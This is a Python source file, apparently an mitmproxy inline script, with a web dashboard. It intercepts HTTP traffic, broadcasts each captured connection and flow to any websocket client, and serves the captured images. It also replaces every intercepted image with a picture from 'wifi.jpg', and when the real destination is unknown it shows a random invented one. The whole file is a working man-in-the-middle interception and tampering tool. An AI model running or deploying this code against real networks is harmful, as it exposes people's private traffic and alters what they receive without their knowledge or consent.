import json
import random
import socket
import threading
import re
import cStringIO
from io import BytesIO
import tornado.ioloop
import tornado.web
import tornado.wsgi
import tornado.websocket
from PIL import Image
from flask import Flask, send_from_directory

app = Flask("mitm", static_folder="client/app", static_url_path="")
app_wsgi = tornado.wsgi.WSGIContainer(app)
ws = None
tornado_app = None
tornado_thread = None
flows = {}


@app.route("/")
def main():
    return send_from_directory("client/app", "index.html")


@app.route("/image/<id>")
def serve_image(id):
    resp = flows[id].response
    return resp.content, resp.code, resp.headers


class WebSocketHandler(tornado.websocket.WebSocketHandler):
    clients = []
    events = []

    def check_origin(self, origin):
        return True

    def open(self, *args):
        print("open", "WebSocketChatHandler")
        WebSocketHandler.clients.append(self)
        self.write_message(json.dumps({
            "type": "history",
            "data": WebSocketHandler.events
        }))

    @classmethod
    def broadcast(cls, type, data):
        message = {
            "type": type,
            "data": data
        }
        WebSocketHandler.events.append(message)
        for client in WebSocketHandler.clients:
            client.write_message(json.dumps(message))

    def on_close(self):
        WebSocketHandler.clients.remove(self)


image_src = None

def parse_image(d):
    global image_src
    s = BytesIO(d)
    image_src = Image.open(s)

def start(ctx, argv):
    with open("wifi.jpg","rb") as f:
        parse_image(f.read())
    global tornado_app, tornado_thread
    tornado_app = tornado.web.Application([
        (r'/events', WebSocketHandler),
        (r".*", tornado.web.FallbackHandler, dict(fallback=app_wsgi))
    ])
    tornado_app.listen(8085)
    tornado_thread = threading.Thread(target=tornado.ioloop.IOLoop.instance().start)
    tornado_thread.daemon = True
    tornado_thread.start()
    print "started"


def done():
    print "done"


def memoize(f):
    memo = {}
    def wrapper(x):
        if x not in memo:
            memo[x] = f(x)
        return memo[x]
    return wrapper


@memoize
def gethostbyaddr(ip):
    try:
        print "gethostbyaddr..."
        host = socket.gethostbyaddr(ip)[0]
        print host
        return host
    except:
        return ip


def clientconnect(ctx, conn):
    def async():
        src = gethostbyaddr(conn.client_conn.address.host)
        if conn.server_conn:
            dst = gethostbyaddr(conn.server_conn.address.host)
        else:
            dst = random.choice(["example.com","github.com","tinder.com"])
        WebSocketHandler.broadcast("connection", dict(src=src, dst=dst))
    t = threading.Thread(target=async)
    t.daemon = True
    t.start()


def response(ctx, flow):
    """
    @param flow: libmproxy.protocol.http.HTTPFlow
    """
    flows[flow.id] = flow
    WebSocketHandler.broadcast("flow", flow.get_state(short=True))
    print "Received flow: %s" % flow

    is_image = (
        (re.search(r"jpe?g|png|gif|webm", flow.request.path) or
        "image" in flow.response.headers.get_first("content-type", ""))
        and flow.response.content
    )
    if is_image:
        handle_image(flow)


def handle_image(flow):
    WebSocketHandler.broadcast("image", dict(
        src=gethostbyaddr(flow.client_conn.address.host),
        url="/image/%s" % flow.id))
    s = BytesIO(flow.response.content)
    img = Image.open(s)

    global image_src
    dst = image_src.copy()
    dst.thumbnail(img.size, Image.ANTIALIAS)

    s = BytesIO()
    dst.save(s, format="png")

    flow.response.content = s.getvalue()
    flow.response.headers["content-type"] = ["image/png"]